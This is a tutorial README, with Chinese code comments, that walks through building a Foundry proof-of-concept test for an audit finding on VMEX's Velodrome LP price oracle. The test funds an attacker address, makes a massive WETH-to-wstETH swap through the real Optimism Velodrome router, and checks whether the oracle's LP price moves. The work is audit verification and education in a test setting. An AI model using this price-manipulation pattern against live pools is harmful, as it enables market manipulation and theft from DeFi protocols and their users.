# Liquidity Prices Attack Foundry Test

## Introduce

We will create a Foundry test (POC Proof of Concept) to verify the [Velodrome LP Share calculation wont work for all velodrome pools](https://github.com/hats-finance/VMEX-0x050183b53cf62bcd6c2a932632f8156953fd146f/issues/24) finding.

We will design a simulation to test an attack scenario where the attacker attempts to mainpulate the price of a liquidity pool (LP) by extensively swapping tokens, and verify if the price changes.

## Setup

1. Init project
   ```
       forge init liquidity_prices_attack --no-commit
   ```
2. Set solc version

   Add solc version in `foundry.toml`

   ```
       solc = '0.8.20'
   ```

   The version of solc refers to the version in OpenZeppelion lib

## Attecker POC

### Find Issue Contracts in project repo

Issus Contract is `VelodromeOracle.sol` in audit repot.

- Github Repo -> Go to file -> Search `VelodromeOracle`-> Raw -> Copy whole `VelodromeOracle` file -> cover `src/Counter.sol` -> ReName `src/Counter.sol` to `src/VelodromeOracle.sol`

- Change `library` to `contract`

### Install dependencies

- `{IERC20}`: Using OZ ERC20 interface replace origin ERC20 contracts

  ```
    cd liquidity_prices_attack
    forge install OpenZeppelin/openzeppelin-contracts --no-commit
  ```

  OZ will intall in the path `lib/openzeppelin-contracts`

  Replace

  ```
    import {IERC20} from "../../interfaces/IERC20WithPermit.sol";
  ```

  To

  ```
    import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
  ```

- `{vMath}`: Using OZ Math interface replace origin Math

  Replace

  ```
    import {vMath} from "./libs/vMath.sol";
  ```

  To

  ```
    import {Math} from "lib/openzeppelin-contracts/contracts/utils/math/Math.sol";
  ```

  There's no `nthroot` function in OZ Math. It's custom-made function. Search it in `vMath.sol` and copy it into the test file as a function of `VelodrmeOracle`

  Github repo -> Go to file -> Search `vMath` -> Find `nthroot` function -> Copy to `VelodromeOracle.sol`, in the `contract VelodromeOracle`

  We don't need the scene when n=3, so delete it.

  ```
    if(n==3){
  	return FixedPointMathLib.cbrt(val);
  }
  ```

  Next, replace

  ```
    uint256 a = vMath.nthroot(2, reserve0 * reserve1); //square root
  uint256 b = vMath.nthroot(2, price0 * price1); //this is in decimals of chainlink oracle
  ```

  to

  ```
    uint256 a = nthroot(2, reserve0 * reserve1); //square root
  uint256 b = nthroot(2, price0 * price1); //this is in decimals of chainlink oracle
  ```

- `{IVeloPair}`: Copy `IVeloPair` interface into test file.

  Github repo -> Go to file -> Search `IVeloPair` -> Raw -> Copy to `VelodromeOracle.sol`, before `contract VelodromeOracle`

### Change Function Visibility

Since the test requires the `get_lp_price` function, its function visibility needs to be changed from `internal` to `public`.

### Build Test

Run `forge build` to check if the basic configuration is correct.

### Set Up Import

- Delete the sample test file, create the new test code or change the name of `Counter.t.sol` to `VerodromeOracle.t.sol`
- Change
  ```
  import "../src/Counter.sol";
  ```
  to
  ```
  import "../src/VerodromeOracle.sol";
  ```
- Delete the sample of test functions, if you rename the sample test file.

```
    import "forge-std/Test.sol";
    import "../src/VerodromeOracle.sol";

```
### Add the addresses required for testing

Search Token address from [Optimism](https://optimistic.etherscan.io/)

1. WETH Address: 0x4200000000000000000000000000000000000006
2. wstETH Address: 0x1F32b1c2345538c0c6f582fCB022739c4A194Ebb

Search `veldrome optimism router` in Google and open the contract [link](https://optimistic.etherscan.io/address/0x9c12939390052919af3155f41bf4160fd3666a6f) 
  - [Velodrome Finance:Router](https://optimistic.etherscan.io/address/0x9c12939390052919af3155f41bf4160fd3666a6f#readContract) -> Contract -> Read Contract -> pairFor
  - Get Stable pair address 
    ![stable_pair](images/stable_pair.png)
    ![stable_pair_addrss](images/stable_pair1.png)
    Stable Pair Address: 0xBf205335De602ac38244F112d712ab04CB59A498
  - Get Volatile pair address
    
    `stable (false)`
    ![](images/volatile_pair.png)
    Volatile Pair Address: 0xc6C1E8399C1c33a3f1959f2f77349D74a373345c

  - Get Velodrome Finance:Router Address
    
    ![Router](images/router.png)
    Velodrome Router: 0x9c12939390052919aF3155f41Bf4160Fd3666A6f

```
    pragma solidity ^0.8.13;

    import "forge-std/Test.sol";
    import "../src/VerodromeOracle.sol";

    contract VeloOracleTest is Test {
        VelodromeOracle public oracle;

        // WETH Address: 0x4200000000000000000000000000000000000006
        // wstETH Address: 0x1F32b1c2345538c0c6f582fCB022739c4A194Ebb
        // Stable Pair Address: 0xBf205335De602ac38244F112d712ab04CB59A498
        // Volatile Pair Address: 0xc6C1E8399C1c33a3f1959f2f77349D74a373345c
        // Velodrome Router: 0x9c12939390052919aF3155f41Bf4160Fd3666A6f
    
    }
```
### Write setUp function

```solidity
    function setUp() public {
        oracle = new VelodromeOracle(); //Inlitialize the oracle with a new instance of VelodromeOracle
    }
```

### Wrtite Test Case Code

We plan to simulate the attack in four steps.

#### 1. Check initial Price
Set stable pair liquidity pool address using `0xBf205335De602ac38244F112d712ab04CB59A498`

```
    STABLE_PAIR = address(0xBf205335De602ac38244F112d712ab04CB59A498);
```

Using `get_lp_price` to fetch the initial price of the LP token from the `oracle` in the `STABLE_PAIR` liquidity pool.

There are two parameters in `get_lp_price(address lp_token, uint256[] memory prices)`
- Using `STABLE_PAIR` for the first parmeter.
- Initializing an arry with fixed values(1e18) for the second parmeter.


#### 2. Check a reserve


#### 3. Do a Massive Swap



#### 4. Verify if Price Changes


```
    function testAttack(){
        // Attack Pattern
        // 1. Check initial Price

        // 2. Check a reserve
        // Trick, just get balance of LP token, since it's so mainpulated yet

        // 3. Do a Massive Swap

        // 4. Verify if Price Changes
    }
```



//TODO
```Solidity
    // testAttack() 函数设计用于模拟并测试一个攻击场景，其中攻击者试图通过大量交换代币来操纵某个流动性池（LP）的价格，并验证价格是否发生了变化。
    function testAttack() public {
        uint256[] memory prices = new uint256[](2);
        prices[0] = 1e18;
        prices[1] = 1e18;
        // Attack Pattern
        // Check initial Price
        uint256 initialPrice = oracle.get_lp_price(STABLE_PAIR, prices);
        console2.log("initialPrice", initialPrice);
        // Check a reserve
        // Trick, just get balance of LP token, since it's so mainpulated yet
        uint256 initialBalanceOfWETH = WETH.balanceOf(STABLE_PAIR);

        vm.startPrank(ATTACKER); // 在设置测试环境中，使得所有在 vm.startPrank 和 vm.stopPrank() 之间的调用都表现得好像是由 ATTACKER 这个地址发起的。

        // Do a massive swap
        deal(address(WETH), address(ATTACKER), initialBalanceOfWETH); // 使用 deal 函数为 `ATTACKER` 地址设置 `initialBalanceOfWETH` 数量的 `WETH` 代币
        WETH.approve(address(VELO_ROUTER), initialBalanceOfWETH); //  允许 VELO_ROUTER 合约从攻击者 (ATTACKER) 的账户中转出最多 initialBalanceOfWETH 数量的 WETH 代币。

        /**
        struct route {
            address from;
            address to;
            bool stable;
        }
        */
        IRouter.route[] memory r = new IRouter.route[](1);
        IRouter.route memory the_route = IRouter.route({
            from: address(WETH),
            to: address(WSTETH),
            stable: true
        });

        r[0] = the_route;
        VELO_ROUTER.swapExactTokensForTokens(initialBalanceOfWETH, 1, r, address(ATTACKER), block.timestamp);
        /**
            在提供的测试代码中，`Router`（在这个上下文中是 `VELO_ROUTER`）充当去中心化交易所（DEX）的路由合约。去中心化交易所通常使用路由合约来简化和优化用户执行代币交换的流程。具体来说，路由合约提供了以下功能：

            1. **代币交换**：路由合约允许用户将一种代币交换为另一种代币。在您的测试代码中，`swapExactTokensForTokens` 函数正是用于此目的。它允许用户指定输入代币的数量（`amountIn`）、输出代币的最小接收数量（`amountOutMin`）、交换路径（`routes`）、接收代币的地址（`to`）以及交易的截止时间（`deadline`）。

            2. **路径优化**：路由合约能够处理复杂的交易路径。例如，如果用户想要从代币A兑换到代币C，但市场上没有直接的A-C交易对，路由合约可以自动找到最优路径（比如通过代币B进行中转：A-B-C）来完成交易。

            3. **滑点保护**：通过指定 `amountOutMin`（输出代币的最小接收数量），用户可以设置对滑点（即交易价格在交易确认前后的变动）的容忍程度，以此来保护自己免受市场波动的不利影响。

            4. **交互简化**：路由合约简化了与多个流动性池或交易对合约的交互。用户只需与路由合约交互即可，而路由合约则负责与背后的具体池子或交易对进行所有必要的交互。

            在您的测试代码中，`VELO_ROUTER` 被用来模拟一个攻击场景，其中攻击者通过执行大规模的代币交换来尝试影响流动性池的价格。通过调用 `swapExactTokensForTokens` 函数，测试模拟了攻击者将大量 `WETH` 代币交换为 `WSTETH` 代币的过程，同时检查了这次交换是否会对流动性池的价格产生显著影响。
         */

        // verify if price changes
        uint256 newPrice = oracle.get_lp_price(STABLE_PAIR, prices);
        console2.log("newPrice", newPrice);
        assertEq(initialPrice, newPrice, "Different");
    }
```

Fuzzy Testing

```
    // testAttack() 函数设计用于模拟并测试一个攻击场景，其中攻击者试图通过大量交换代币来操纵某个流动性池（LP）的价格，并验证价格是否发生了变化。
    function testAttack(uint128 randomAmount) public {
        uint256[] memory prices = new uint256[](2);
        prices[0] = 1e18;
        prices[1] = 1e18;
        // Attack Pattern
        // Check initial Price
        uint256 initialPrice = oracle.get_lp_price(STABLE_PAIR, prices);
        console2.log("initialPrice", initialPrice);
        // Check a reserve
        // Trick, just get balance of LP token, since it's so mainpulated yet
        uint256 initialBalanceOfWETH = WETH.balanceOf(STABLE_PAIR);

        vm.startPrank(ATTACKER); // 在设置测试环境中，使得所有在 vm.startPrank 和 vm.stopPrank() 之间的调用都表现得好像是由 ATTACKER 这个地址发起的。

        // Do a massive swap
        deal(address(WETH), address(ATTACKER), randomAmount); // 使用 deal 函数为 `ATTACKER` 地址设置 `initialBalanceOfWETH` 数量的 `WETH` 代币
        WETH.approve(address(VELO_ROUTER), randomAmount); //  允许 VELO_ROUTER 合约从攻击者 (ATTACKER) 的账户中转出最多 initialBalanceOfWETH 数量的 WETH 代币。

        /**
        struct route {
            address from;
            address to;
            bool stable;
        }
        */
        IRouter.route[] memory r = new IRouter.route[](1);
        IRouter.route memory the_route = IRouter.route({
            from: address(WETH),
            to: address(WSTETH),
            stable: true
        });

        r[0] = the_route;
        VELO_ROUTER.swapExactTokensForTokens(randomAmount, 1, r, address(ATTACKER), block.timestamp);

        // verify if price changes
        uint256 newPrice = oracle.get_lp_price(STABLE_PAIR, prices);
        console2.log("newPrice", newPrice);
        assertEq(initialPrice / 1_000, newPrice / 1_000, "Different");
    }
```

Case From: [Foundry for Blazing Fast Brute Forcing](https://youtu.be/tDFA8cnHoCY?t=8063)
